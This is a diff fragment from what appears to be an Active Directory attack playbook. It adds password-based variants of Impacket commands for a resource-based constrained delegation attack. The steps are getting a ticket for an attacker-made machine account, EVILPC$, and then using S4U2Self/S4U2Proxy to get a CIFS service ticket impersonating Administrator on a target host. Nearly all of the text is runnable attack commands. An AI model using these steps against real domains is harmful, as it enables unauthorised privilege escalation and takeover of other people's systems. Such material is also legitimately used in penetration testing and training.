@@ -135,10 +135,14 @@ impacket-rbcd $DOMAIN/$USER:$PASS -dc-ip $DC_IP \
     -action write -delegate-to TARGET_COMPUTER$ -delegate-from EVILPC$
 
 # Step 4 — Get TGT for EVILPC
+impacket-getTGT $DOMAIN/EVILPC$:$PASS -dc-ip $DC_IP
+[OR] # Use hash
 impacket-getTGT $DOMAIN/EVILPC$ -dc-ip $DC_IP -hashes ':EVILPC_HASH'
 export KRB5CCNAME=EVILPC.ccache
 
 # Step 5 — S4U2Self + S4U2Proxy → get service ticket as Administrator
+impacket-getST $DOMAIN/EVILPC$:$PASS -dc-ip $DC_IP -spn cifs/TARGET_COMPUTER.corp.local -impersonate Administrator
+[OR] # Use hash
 impacket-getST $DOMAIN/EVILPC$ -dc-ip $DC_IP \
     -spn cifs/TARGET_COMPUTER.corp.local \
     -impersonate Administrator \
